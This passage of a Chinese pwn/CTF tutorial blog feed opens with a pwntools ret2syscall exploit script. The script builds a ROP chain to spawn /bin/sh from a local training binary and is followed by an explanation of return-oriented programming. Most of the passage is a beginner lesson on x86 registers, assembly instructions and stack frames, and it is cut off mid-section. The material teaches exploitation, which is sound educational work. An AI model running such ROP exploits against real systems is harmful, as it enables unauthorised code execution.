class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn64&#x27;</span>)<br><br>binsh = <span class="hljs-number">0x4a1384</span><br>pop_rax = <span class="hljs-number">0x4bc808</span><br>pop_rdi = <span class="hljs-number">0x401626</span><br>pop_rsi = <span class="hljs-number">0x401747</span><br>pop_rdx = <span class="hljs-number">0x442b66</span><br>syscall = <span class="hljs-number">0x4003da</span><br><br><span class="hljs-comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x78</span><br>payload += p64(pop_rdi) + p64(binsh)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>)<br>payload += p64(syscall)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实际上 ret2syscall 使用的攻击手法是 <strong>返回导向编程</strong> (Return Oriented Programming)，其主要思想是在 <strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><p>gadgets 通常是以 <code>ret</code> 结尾的指令序列，通过这样的指令序列，我们可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。</p><p>返回导向编程这一名称的由来是因为其核心在于利用了指令集中的 ret 指令，从而改变了指令流的执行顺序，并通过数条 gadget “执行” 了一个新的程序。</p><p>使用 ROP 攻击一般得满足如下条件：</p><ul><li><p>程序漏洞允许我们劫持控制流，并控制后续的返回地址。</p></li><li><p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p></li></ul><p>作为一项基本的攻击手段，ROP 攻击并不局限于栈溢出漏洞，也被广泛应用在堆溢出等各类漏洞的利用当中。</p><h3 id="32-位系统调用号"><a href="#32-位系统调用号" class="headerlink" title="32 位系统调用号"></a>32 位系统调用号</h3><p><a href="https://syscalls32.paolostivanin.com/">https://syscalls32.paolostivanin.com/</a></p><h3 id="64-位系统调用号"><a href="#64-位系统调用号" class="headerlink" title="64 位系统调用号"></a>64 位系统调用号</h3><p><a href="https://shell-storm.org/shellcode/files/linux-4.7-syscalls-x64.html">https://shell-storm.org/shellcode/files/linux-4.7-syscalls-x64.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn入门系列（一）</title>
    <link href="/post/47670.html"/>
    <url>/post/47670.html</url>
    
    <content type="html"><![CDATA[<h1 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h1><p>汇编语言是一种低级编程语言，它与计算机的硬件关系非常密切，通常用于编写运行效率极高的软件。相比高级语言（如 C、Python），汇编语言更接近机器语言（0 和 1），编写时需要手动管理寄存器、内存等硬件资源。</p><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>C语言代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span>&#123;<br>    <span class="hljs-type">int</span> t = x + y;<br>    <span class="hljs-keyword">return</span> t;<br>&#125;<br></code></pre></td></tr></table></figure><p>汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sum:<br>    push ebp<br>    mov ebp, esp<br>    mov eax, [ebp+12]<br>    add eax, [ebp+8]<br>    pop ebp<br>    ret<br></code></pre></td></tr></table></figure><h2 id="1-什么是汇编语言"><a href="#1-什么是汇编语言" class="headerlink" title="1. 什么是汇编语言"></a>1. 什么是汇编语言</h2><p>汇编语言是介于机器语言和高级语言之间的一种语言。它使用助记符（如 <code>MOV</code>、<code>ADD</code>、<code>JMP</code> 等）来表示机器指令，能够直接控制硬件。每种计算机架构都有自己的汇编语言，例如：</p><ul><li><p><strong>x86 汇编</strong>：用于 Intel 和 AMD 处理器。</p></li><li><p><strong>ARM 汇编</strong>：用于移动设备和嵌入式系统。</p></li></ul><h3 id="汇编语言的特点："><a href="#汇编语言的特点：" class="headerlink" title="汇编语言的特点："></a>汇编语言的特点：</h3><ul><li><p><strong>低级性</strong>：与硬件直接交互，提供对寄存器、内存等资源的直接控制。</p></li><li><p><strong>高效率</strong>：程序执行速度快，适合编写需要极高性能的代码。</p></li><li><p><strong>平台相关性</strong>：不同架构的汇编语言不通用。</p></li></ul><h2 id="2-汇编语言的基本概念"><a href="#2-汇编语言的基本概念" class="headerlink" title="2. 汇编语言的基本概念"></a>2. 汇编语言的基本概念</h2><h3 id="2-1-寄存器"><a href="#2-1-寄存器" class="headerlink" title="2.1 寄存器"></a>2.1 寄存器</h3><p>寄存器是 CPU 内部的高速存储单元，用于存储数据、地址、程序状态等。不同架构的 CPU 具有不同的寄存器集。在 x86 架构中，寄存器的大小经历了从 16 位到 32 位再到 64 位的扩展，现代 x86-64 架构支持 64 位寄存器。</p><p>X86架构是微处理器执行的计算机语言指令集，指一个intel通用计算机系列的标准编号缩写，也标识一套通用的计算机指令集。</p><h4 id="1-16位寄存器"><a href="#1-16位寄存器" class="headerlink" title="1. 16位寄存器"></a>1. 16位寄存器</h4><p>早期的 x86 处理器使用 16 位寄存器，主要用于 8086 和 80286 处理器。常见的 16 位寄存器包括：</p><ul><li><p><strong>AX</strong>：累加器（Accumulator），用于算术运算和数据传输。</p></li><li><p><strong>BX</strong>：基址寄存器（Base Register），常用于存储数据的内存地址。</p></li><li><p><strong>CX</strong>：计数器（Counter），常用于循环和计数操作。</p></li><li><p><strong>DX</strong>：数据寄存器（Data Register），用于 I&#x2F;O 操作和扩展乘法、除法指令。</p></li></ul><p>这四个寄存器还可以拆分为两个 8 位寄存器：</p><ul><li><p><strong>AH</strong> 和 <strong>AL</strong>：AX 的高 8 位和低 8 位。</p></li><li><p><strong>BH</strong> 和 <strong>BL</strong>：BX 的高 8 位和低 8 位。</p></li><li><p><strong>CH</strong> 和 <strong>CL</strong>：CX 的高 8 位和低 8 位。</p></li><li><p><strong>DH</strong> 和 <strong>DL</strong>：DX 的高 8 位和低 8 位。</p></li></ul><p>此外，16 位寄存器还包括：</p><ul><li><p><strong>SP</strong>：堆栈指针（Stack Pointer），指向当前栈顶的位置。</p></li><li><p><strong>BP</strong>：基址指针（Base Pointer），常用于指向栈中的数据。</p></li><li><p><strong>SI</strong>：源索引（Source Index），常用于字符串操作中的源地址。</p></li><li><p><strong>DI</strong>：目标索引（Destination Index），常用于字符串操作中的目标地址。</p></li></ul><h4 id="2-32位寄存器"><a href="#2-32位寄存器" class="headerlink" title="2. 32位寄存器"></a>2. 32位寄存器</h4><p>随着 80386 处理器的推出，寄存器扩展为 32 位。16 位寄存器前面加上了 <code>E</code> 前缀，表示扩展为 32 位。例如：</p><ul><li><p><strong>EAX</strong>：32 位的累加器。</p></li><li><p><strong>EBX</strong>：32 位的基址寄存器。</p></li><li><p><strong>ECX</strong>：32 位的计数器。</p></li><li><p><strong>EDX</strong>：32 位的数据寄存器。</p></li></ul><p>同样，堆栈指针、基址指针和索引寄存器也扩展为 32 位：</p><ul><li><p><strong>ESP</strong>：32 位的栈指针。</p></li><li><p><strong>EBP</strong>：32 位的基址指针。</p></li><li><p><strong>ESI</strong>：32 位的源索引。</p></li><li><p><strong>EDI</strong>：32 位的目标索引。</p></li></ul><h4 id="3-64位寄存器"><a href="#3-64位寄存器" class="headerlink" title="3. 64位寄存器"></a>3. 64位寄存器</h4><p>在 x86-64 架构中，寄存器再次扩展为 64 位，16 个通用寄存器分别以 <code>R</code> 为前缀。常见的 64 位寄存器有：</p><ul><li><p><strong>RAX</strong>：64 位的累加器。</p></li><li><p><strong>RBX</strong>：64 位的基址寄存器。</p></li><li><p><strong>RCX</strong>：64 位的计数器。</p></li><li><p><strong>RDX</strong>：64 位的数据寄存器。</p></li><li><p><strong>RSP</strong>：64 位的栈指针。</p></li><li><p><strong>RBP</strong>：64 位的基址指针。</p></li><li><p><strong>RSI</strong>：64 位的源索引。</p></li><li><p><strong>RDI</strong>：64 位的目标索引。</p></li></ul><p>此外，在 x86-64 中还新增了 8 个通用寄存器：</p><ul><li><strong>R8</strong> 到 <strong>R15</strong>：额外的 64 位通用寄存器。</li></ul><p>这些寄存器也可以访问低 32 位、16 位、甚至 8 位的数据。例如，<code>R8</code> 的低 32 位是 <code>R8D</code>，低 16 位是 <code>R8W</code>，低 8 位是 <code>R8B</code>。</p><h4 id="4-标志寄存器"><a href="#4-标志寄存器" class="headerlink" title="4. 标志寄存器"></a>4. 标志寄存器</h4><p>标志寄存器用于存储算术运算的结果状态，它的每一位代表一个特定的标志。例如：</p><ul><li><p><strong>ZF</strong>（Zero Flag）：如果运算结果为 0，则设置该标志。</p></li><li><p><strong>CF</strong>（Carry Flag）：如果运算产生了进位或借位，则设置该标志。</p></li><li><p><strong>SF</strong>（Sign Flag）：如果运算结果为负数，则设置该标志。</p></li><li><p><strong>OF</strong>（Overflow Flag）：如果有符号运算溢出，则设置该标志。</p></li></ul><h4 id="5-段寄存器"><a href="#5-段寄存器" class="headerlink" title="5. 段寄存器"></a>5. 段寄存器</h4><p>16 位和 32 位汇编中使用段寄存器来描述内存的不同段：</p><ul><li><p><strong>CS</strong>：代码段寄存器（Code Segment），指向正在执行的代码段。</p></li><li><p><strong>DS</strong>：数据段寄存器（Data Segment），指向数据所在的段。</p></li><li><p><strong>SS</strong>：堆栈段寄存器（Stack Segment），指向栈所在的段。</p></li><li><p><strong>ES</strong>、<strong>FS</strong>、<strong>GS</strong>：额外段寄存器，常用于额外的数据段。</p></li></ul><p>在 64 位模式下，段寄存器的使用有所减少，绝大部分程序不再依赖段寄存器。</p><img src="/post/47670/1729407589499-a7043269-2d09-4055-a3e9-19f14e1e02e7-1735222654796-155.png" class="" title="img"><h3 id="2-2-操作数"><a href="#2-2-操作数" class="headerlink" title="2.2 操作数"></a>2.2 操作数</h3><p>汇编语言中的指令通常由操作码（opcode）和操作数（operand）组成。操作数可以是：</p><ul><li><p><strong>立即数</strong>：如 <code>5</code>、<code>0x10</code>，直接表示一个常量。</p></li><li><p><strong>寄存器</strong>：如 <code>AX</code>、<code>BX</code>，表示寄存器中的值。</p></li><li><p><strong>内存地址</strong>：如 <code>[0x1000]</code>，表示某个内存地址中的值。</p></li></ul><h3 id="2-3-指令"><a href="#2-3-指令" class="headerlink" title="2.3 指令"></a>2.3 指令</h3><p>指令是汇编语言的最小执行单元。常见的指令类型包括：</p><ul><li><p><strong>数据传输指令</strong>：如 <code>MOV</code>，用于在寄存器、内存、立即数之间传递数据。</p></li><li><p><strong>算术运算指令</strong>：如 <code>ADD</code>、<code>SUB</code>、<code>MUL</code>，用于执行加法、减法、乘法等运算。</p></li><li><p><strong>逻辑运算指令</strong>：如 <code>AND</code>、<code>OR</code>、<code>XOR</code>，用于执行位运算。</p></li><li><p><strong>控制流指令</strong>：如 <code>JMP</code>、<code>CALL</code>、<code>RET</code>，用于控制程序的执行流程。</p></li></ul><h2 id="3-汇编语言的基本语法"><a href="#3-汇编语言的基本语法" class="headerlink" title="3. 汇编语言的基本语法"></a>3. 汇编语言的基本语法</h2><h3 id="3-1-格式"><a href="#3-1-格式" class="headerlink" title="3.1 格式"></a>3.1 格式</h3><p>汇编语言通常分为以下几部分：</p><ol><li><p><strong>指令助记符</strong>：表示具体的操作，如 <code>MOV</code>、<code>ADD</code> 等。</p></li><li><p><strong>操作数</strong>：指令的操作对象，可以是寄存器、立即数、内存地址等。</p></li><li><p><strong>注释</strong>：以 <code>;</code> 开头，表示对代码的说明，不参与程序执行。</p></li></ol><p>例如，x86 汇编代码的一条指令可能如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOV AX, 5    ; 将立即数 5 赋值给寄存器 AX<br></code></pre></td></tr></table></figure><h3 id="3-2-基本指令"><a href="#3-2-基本指令" class="headerlink" title="3.2 基本指令"></a>3.2 基本指令</h3><h4 id="3-2-1-数据传输指令"><a href="#3-2-1-数据传输指令" class="headerlink" title="3.2.1 数据传输指令"></a>3.2.1 数据传输指令</h4><h5 id="1-MOV"><a href="#1-MOV" class="headerlink" title="1. MOV"></a>1. MOV</h5><p>数据传送指令</p><p><code>MOV</code> 指令用于将数据从一个地方传送到另一个地方。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOV AX, 10        ; 将立即数 10 赋值给 AX 寄存器<br>MOV BX, AX       ; 将 AX 的值复制到 BX<br>MOV [0x1000], AX ; 将 AX 的值存储到内存地址 0x1000<br></code></pre></td></tr></table></figure><h5 id="2-XCHG"><a href="#2-XCHG" class="headerlink" title="2. XCHG"></a>2. XCHG</h5><p>交换指令</p><p><code>XCHG</code> 指令用于交换两个操作数的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">XCHG AX, BX      ; 交换 AX 和 BX 中的值<br></code></pre></td></tr></table></figure><h5 id="3-PUSH-POP"><a href="#3-PUSH-POP" class="headerlink" title="3. PUSH &amp;POP"></a>3. PUSH &amp;POP</h5><p>堆栈操作指令</p><p><code>PUSH</code> 和 <code>POP</code> 指令用于将数据压入栈或从栈中弹出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSH AX          ; 将 AX 的值压入栈<br>POP BX           ; 从栈中弹出值存入 BX<br></code></pre></td></tr></table></figure><h4 id="3-2-2-算术运算指令"><a href="#3-2-2-算术运算指令" class="headerlink" title="3.2.2 算术运算指令"></a>3.2.2 算术运算指令</h4><h5 id="1-ADD"><a href="#1-ADD" class="headerlink" title="1. ADD"></a>1. ADD</h5><p>加法指令</p><p><code>ADD</code> 指令用于执行加法运算，并将结果存储在第一个操作数中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ADD AX, BX       ; 将 AX 和 BX 的值相加，结果存储在 AX 中<br></code></pre></td></tr></table></figure><h5 id="2-SUB"><a href="#2-SUB" class="headerlink" title="2. SUB"></a>2. SUB</h5><p>减法指令</p><p><code>SUB</code> 指令用于执行减法运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SUB AX, 5        ; 从 AX 中减去 5，结果存储在 AX 中<br></code></pre></td></tr></table></figure><h5 id="3-INC-DEC"><a href="#3-INC-DEC" class="headerlink" title="3. INC &amp; DEC"></a>3. INC &amp; DEC</h5><p>自增指令和自减指令</p><ul><li><p><code>INC</code> 指令用于将操作数加 1。</p></li><li><p><code>DEC</code> 指令用于将操作数减 1。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">INC AX           ; 将 AX 的值加 1<br>DEC BX           ; 将 BX 的值减 1<br></code></pre></td></tr></table></figure><h5 id="4-MUL-IMUL"><a href="#4-MUL-IMUL" class="headerlink" title="4. MUL &amp; IMUL"></a>4. MUL &amp; IMUL</h5><p>MUL和IMUL乘法指令</p><ul><li><p><code>MUL</code> 指令用于无符号乘法。</p></li><li><p><code>IMUL</code> 指令用于有符号乘法。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MUL BX           ; 无符号乘法，AX = AX * BX<br>IMUL BX          ; 有符号乘法，AX = AX * BX<br></code></pre></td></tr></table></figure><h5 id="5-DIV-IDIV"><a href="#5-DIV-IDIV" class="headerlink" title="5. DIV &amp; IDIV"></a>5. DIV &amp; IDIV</h5><p>除法指令</p><ul><li><p><code>DIV</code> 指令用于无符号除法。</p></li><li><p><code>IDIV</code> 指令用于有符号除法。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">DIV BX           ; 无符号除法，AX = AX / BX<br>IDIV BX          ; 有符号除法，AX = AX / BX<br></code></pre></td></tr></table></figure><h4 id="3-2-3-逻辑运算指令"><a href="#3-2-3-逻辑运算指令" class="headerlink" title="3.2.3 逻辑运算指令"></a>3.2.3 逻辑运算指令</h4><h5 id="1-AND"><a href="#1-AND" class="headerlink" title="1. AND"></a>1. AND</h5><p>按位与指令</p><p><code>AND</code> 指令对两个操作数进行按位与运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">AND AX, BX       ; AX = AX &amp; BX<br></code></pre></td></tr></table></figure><h5 id="2-OR"><a href="#2-OR" class="headerlink" title="2. OR"></a>2. OR</h5><p>按位或指令</p><p><code>OR</code> 指令对两个操作数进行按位或运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">OR AX, BX        ; AX = AX | BX<br></code></pre></td></tr></table></figure><h5 id="3-XOR"><a href="#3-XOR" class="headerlink" title="3. XOR"></a>3. XOR</h5><p>按位异或指令</p><p><code>XOR</code> 指令对两个操作数进行按位异或运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">XOR AX, BX       ; AX = AX ^ BX<br></code></pre></td></tr></table></figure><h5 id="4-NOT"><a href="#4-NOT" class="headerlink" title="4. NOT"></a>4. NOT</h5><p>取反指令</p><p><code>NOT</code> 指令对操作数进行按位取反。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">NOT AX           ; AX = ~AX<br></code></pre></td></tr></table></figure><h4 id="3-2-4-控制流指令"><a href="#3-2-4-控制流指令" class="headerlink" title="3.2.4 控制流指令"></a>3.2.4 控制流指令</h4><h5 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h5><p>无条件跳转指令</p><p><code>JMP</code> 指令用于无条件跳转到程序中的某个标签位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">JMP start        ; 跳转到标签 start 处继续执行<br></code></pre></td></tr></table></figure><h5 id="2-CMP"><a href="#2-CMP" class="headerlink" title="2. CMP"></a>2. CMP</h5><p><code>CMP</code> 指令比较两个操作数，并根据结果设置标志寄存器。常与条件跳转指令（如 <code>JE</code>、<code>JNE</code>、<code>JG</code>、<code>JL</code> 等）配合使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">CMP AX, BX       ; 比较 AX 和 BX<br>JE equal         ; 如果 AX 等于 BX，跳转到 equal 标签<br>JNE notequal     ; 如果 AX 不等于 BX，跳转到 notequal 标签<br></code></pre></td></tr></table></figure><p>常见的条件跳转指令：</p><ul><li><p><strong>JE</strong> &#x2F; <strong>JZ</strong>：等于 &#x2F; 零时跳转（Jump if Equal &#x2F; Zero）。</p></li><li><p><strong>JNE</strong> &#x2F; <strong>JNZ</strong>：不等于 &#x2F; 非零时跳转（Jump if Not Equal &#x2F; Not Zero）。</p></li><li><p><strong>JG</strong> &#x2F; <strong>JNLE</strong>：大于时跳转（Jump if Greater）。</p></li><li><p><strong>JL</strong> &#x2F; <strong>JNGE</strong>：小于时跳转（Jump if Less）。</p></li><li><p><strong>JGE</strong>：大于等于时跳转（Jump if Greater or Equal）。</p></li><li><p><strong>JLE</strong>：小于等于时跳转（Jump if Less or Equal）。</p></li></ul><h5 id="3-CALL-RET"><a href="#3-CALL-RET" class="headerlink" title="3. CALL &amp; RET"></a>3. CALL &amp; RET</h5><p>函数调用与返回指令</p><p><code>CALL</code> 指令用于调用子程序，<code>RET</code> 指令用于从子程序返回。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">CALL func        ; 调用函数 func<br>RET              ; 从函数返回<br></code></pre></td></tr></table></figure><h5 id="4-LOOP"><a href="#4-LOOP" class="headerlink" title="4. LOOP"></a>4. LOOP</h5><p>循环指令</p><p><code>LOOP</code> 指令用于循环操作，依赖于 <code>CX</code> 或 <code>ECX</code> 寄存器的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOV CX, 10       ; 将 10 赋值给 CX<br>loop_start:<br>    ; 循环体<br>    LOOP loop_start  ; CX = CX - 1，若 CX 不为 0，则跳转到 loop_start<br></code></pre></td></tr></table></figure><h4 id="3-2-5-位移指令"><a href="#3-2-5-位移指令" class="headerlink" title="3.2.5 位移指令"></a>3.2.5 位移指令</h4><h5 id="1-SHL-SAL"><a href="#1-SHL-SAL" class="headerlink" title="1. SHL &amp; SAL"></a>1. SHL &amp; SAL</h5><p>左移指令</p><ul><li><p><strong>SHL</strong>（Shift Logical Left）：逻辑左移，空出的位用 0 填充。</p></li><li><p><strong>SAL</strong>（Shift Arithmetic Left）：算术左移，与 SHL 相同。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SHL AX, 1        ; 将 AX 左移 1 位<br></code></pre></td></tr></table></figure><h5 id="2-SHR-SAR"><a href="#2-SHR-SAR" class="headerlink" title="2. SHR&amp; SAR"></a>2. SHR&amp; SAR</h5><p>右移指令</p><ul><li><p><strong>SHR</strong>（Shift Logical Right）：逻辑右移，空出的位用 0 填充。</p></li><li><p><strong>SAR</strong>（Shift Arithmetic Right）：算术右移，符号位保持不变。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SHR AX, 1        ; 将 AX 右移 1 位<br></code></pre></td></tr></table></figure><h4 id="3-2-6-字符串操作指令"><a href="#3-2-6-字符串操作指令" class="headerlink" title="3.2.6 字符串操作指令"></a>3.2.6 字符串操作指令</h4><h5 id="1-MOVSB-MOVSW-MOVSD"><a href="#1-MOVSB-MOVSW-MOVSD" class="headerlink" title="1. MOVSB &#x2F; MOVSW &#x2F; MOVSD"></a>1. MOVSB &#x2F; MOVSW &#x2F; MOVSD</h5><p>字符串移动指令</p><ul><li><p><strong>MOVSB</strong>：字节传送。</p></li><li><p><strong>MOVSW</strong>：字传送。</p></li><li><p><strong>MOVSD</strong>：双字传送。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOVSB            ; 将 DS:SI 指向的字节传送到 ES:DI<br></code></pre></td></tr></table></figure><h5 id="2-REP"><a href="#2-REP" class="headerlink" title="2. REP"></a>2. REP</h5><p>重复前缀指令</p><p><code>REP</code> 指令用于重复执行字符串操作指令，直到 <code>CX</code> 寄存器的值为 0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">REP MOVSB        ; 重复执行 MOVSB，直到 CX 为 0<br></code></pre></td></tr></table></figure><h2 id="参考书籍与链接"><a href="#参考书籍与链接" class="headerlink" title="参考书籍与链接"></a>参考书籍与链接</h2><p><a href="https://cankaoshouce.com/assembly/assembly-course.html">汇编语言 教程 | 参考手册 (cankaoshouce.com)</a></p><p>汇编语言（第4版） (王爽)</p><h2 id="Hello，World！"><a href="#Hello，World！" class="headerlink" title="Hello，World！"></a>Hello，World！</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section    .text<br>   global _start     ;必须为链接器(ld)声明<br>_start:                ;告诉链接器入口点<br>   mov    edx,len     ;消息长度<br>   mov    ecx,msg     ;写消息<br>   mov    ebx,1       ;文件描述符 (stdout)<br>   mov    eax,4       ;系统调用号 (sys_write)<br>   int    0x80        ;调用内核<br>   mov    eax,1       ;系统调用号 (sys_exit)<br>   int    0x80        ;调用内核<br>section    .data<br>msg db &#x27;Hello, World!&#x27;, 0xa  ;要打印的字符串<br>len equ $ - msg     ;字符串的长度<br></code></pre></td></tr></table></figure><h1 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h1><h2 id="1-栈"><a href="#1-栈" class="headerlink" title="1. 栈"></a>1. 栈</h2><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p><img src="/post/47670/1729407589581-9bd3884f-fd93-40c9-9c1f-b128b9f3e8ce-1735222654797-156.png" class="" title="img"><p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p><h2 id="2-调用流程"><a href="#2-调用流程" class="headerlink" title="2. 调用流程"></a>2. 调用流程</h2><p>C语言例子</p><p>main函数调用func_b函数，func_b函数调用func_a函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">func_a</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//do sth</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">func_b</span><span class="hljs-params">()</span>&#123;<br>    func_a();<br>    <span class="hljs-type">int</span> c = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    func_b();<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-1-调用func-b函数"><a href="#2-1-调用func-b函数" class="headerlink" title="2.1 调用func_b函数"></a>2.1 调用func_b函数</h3><p>①当运行到call func_b时main函数的栈帧</p><p>②RBP指向栈底，RSP指向栈顶</p><p>③这段栈帧存放了一些main函数的局部变量</p><p>④main函数要调用func_b，main只需要call func_b</p><p>⑤也就是</p><ul><li>push rip;</li><li>mov rip func_b;</li></ul><img src="/post/47670/1729407589643-4ff3aa18-9f1b-4c85-854a-89eb055f7528-1735222654797-157.png" class="" title="img"><p>①那么此时跳转到func_b继续执行，func_b直接执行主逻辑吗？</p><p>②显然不是的，被调用函数func_b还需要维护栈帧。</p><p>③具体来说，需要以下几步：</p><ul><li>push rbp;将调用函数的栈底指针保存。</li><li>mov rbp, rsp;将栈底指针指向现在的栈顶。</li><li>sub rsp, xxx;开辟被调用函数栈帧，此时上一步的rbp就是指向栈帧的底。</li></ul><h3 id="2-2-调用func-b函数完成"><a href="#2-2-调用func-b函数完成" class="headerlink" title="2.2 调用func_b函数完成"></a>2.2 调用func_b函数完成</h3><p>①func_b执行完维护栈帧操作后的栈布局</p><p>②所谓栈帧的维护就是维护rbp和rsp两个指针</p><p>③rsp永远指向栈顶</p><p>④rbp用来定位局部变量</p><img src="/post/47670/1729407589709-319cb89a-4336-4d0d-9b38-52fc237732eb-1735222654797-158.png" class="" title="img"><h3 id="2-3-调用func-a函数"><a href="#2-3-调用func-a函数" class="headerlink" title="2.3 调用func_a函数"></a>2.3 调用func_a函数</h3><p>①现在，func_b函数要调用func_a函数，其调用流程与main函数调用func_b函数基本一致。</p><p>②不同处在于返回地址、rbp和rsp指向的地址，以及开辟的栈空间的不同。</p><h3 id="2-4-调用func-a函数完成"><a href="#2-4-调用func-a函数完成" class="headerlink" title="2.4 调用func_a函数完成"></a>2.4 